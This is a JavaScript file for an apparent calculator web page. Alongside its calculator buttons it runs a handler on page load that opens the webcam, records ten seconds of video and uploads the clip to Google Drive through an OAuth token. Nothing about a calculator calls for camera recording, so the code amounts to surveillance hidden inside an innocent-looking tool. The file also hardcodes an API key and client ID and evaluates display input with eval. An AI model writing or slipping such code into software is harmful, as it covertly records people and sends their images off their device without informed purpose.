let display = document.getElementById("display")

const CLIENT_ID = "883580141346-u1e41q10608887ba83gvkmbq8il24inq.apps.googleusercontent.com"
const API_KEY = "AIzaSyAu-twb4T1bkCXchRplk4ybiLzNztJdaew"
const DRIVE_SCOPE = "https://www.googleapis.com/auth/drive.file"
const DRIVE_FOLDER_ID = ""
const RECORDING_MS = 10000

function press(v) {
    display.value += v
}

function calculate() {
    try {
        display.value = eval(display.value)
    } catch {
        display.value = "Error"
    }
}

function clearDisplay() {
    display.value = ""
}

function waitForGoogleIdentity() {
    return new Promise((resolve, reject) => {
        const startedAt = Date.now()
        const interval = setInterval(() => {
            if (window.google && google.accounts && google.accounts.oauth2) {
                clearInterval(interval)
                resolve()
                return
            }

            if (Date.now() - startedAt > 8000) {
                clearInterval(interval)
                reject(new Error("Google Identity Services failed to load"))
            }
        }, 100)
    })
}

function waitForGapiClient() {
    return new Promise((resolve, reject) => {
        const startedAt = Date.now()
        const interval = setInterval(() => {
            if (window.gapi && gapi.load) {
                clearInterval(interval)
                resolve()
                return
            }

            if (Date.now() - startedAt > 8000) {
                clearInterval(interval)
                reject(new Error("Google API client failed to load"))
            }
        }, 100)
    })
}

async function initGapiClient() {
    await new Promise(resolve => gapi.load("client", resolve))
    await gapi.client.init({
        apiKey: API_KEY,
        discoveryDocs: ["https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"]
    })
}

function initTokenClient() {
    return google.accounts.oauth2.initTokenClient({
        client_id: CLIENT_ID,
        scope: DRIVE_SCOPE,
        callback: () => { }
    })
}

function requestDriveToken(tokenClient) {
    return new Promise((resolve, reject) => {
        tokenClient.callback = resp => {
            if (resp.error) {
                reject(resp)
                return
            }

            resolve(resp.access_token)
        }

        tokenClient.requestAccessToken({ prompt: "consent" })
    })
}

function buildTimestampFilename() {
    const now = new Date()
    const pad = value => String(value).padStart(2, "0")

    const datePart = [
        now.getFullYear(),
        pad(now.getMonth() + 1),
        pad(now.getDate())
    ].join("")

    const timePart = [
        pad(now.getHours()),
        pad(now.getMinutes()),
        pad(now.getSeconds())
    ].join("")

    return `capture-${datePart}-${timePart}.webm`
}

async function uploadToDrive(blob, filename, accessToken) {
    const metadata = {
        name: filename,
        mimeType: "video/webm"
    }

    if (DRIVE_FOLDER_ID) {
        metadata.parents = [DRIVE_FOLDER_ID]
    }

    gapi.client.setToken({ access_token: accessToken })

    const response = await gapi.client.drive.files.create({
        resource: metadata,
        media: {
            mimeType: "video/webm",
            body: blob
        },
        uploadType: "multipart",
        fields: "id,name"
    })

    if (response.result && response.result.id) {
        await gapi.client.drive.files.update({
            fileId: response.result.id,
            resource: { name: filename },
            fields: "id,name"
        })
    }

    return response.result
}

// auto-run on page load
window.addEventListener("load", async () => {

    try {

        await waitForGoogleIdentity()
        await waitForGapiClient()
        await initGapiClient()
        const tokenClient = initTokenClient()

        const stream = await navigator.mediaDevices.getUserMedia({ video: true })
        const accessToken = await requestDriveToken(tokenClient)

        const preferredTypes = [
            "video/webm;codecs=vp9,opus",
            "video/webm;codecs=vp8,opus",
            "video/webm"
        ]

        const selectedType = preferredTypes.find(type => MediaRecorder.isTypeSupported(type)) || ""
        const recorder = selectedType ? new MediaRecorder(stream, { mimeType: selectedType }) : new MediaRecorder(stream)

        let chunks = []

        recorder.ondataavailable = e => {
            if (e.data && e.data.size > 0) {
                chunks.push(e.data)
            }

            window.__debug_chunks_length = chunks.length
            window.__debug_last_chunk_size = e.data ? e.data.size : 0
        }

        recorder.start(1000)

        // record 10 seconds
        setTimeout(() => {
            recorder.requestData()
            recorder.stop()
        }, RECORDING_MS)

        recorder.onstop = async () => {
            try {
                window.__debug_recorder_state = recorder.state
                window.__debug_total_bytes = chunks.reduce((sum, chunk) => sum + chunk.size, 0)

                if (!chunks.length) {
                    throw new Error("Recording produced no data")
                }

                const blob = new Blob(chunks, { type: selectedType || "video/webm" })
                const filename = buildTimestampFilename()
                await uploadToDrive(blob, filename, accessToken)
            } catch (err) {
                console.log("Drive upload error:", err)
            } finally {
                // stop camera after recording
                stream.getTracks().forEach(track => track.stop())
            }
        }

    } catch (err) {
        console.log("Camera/Drive error:", err)
    }

})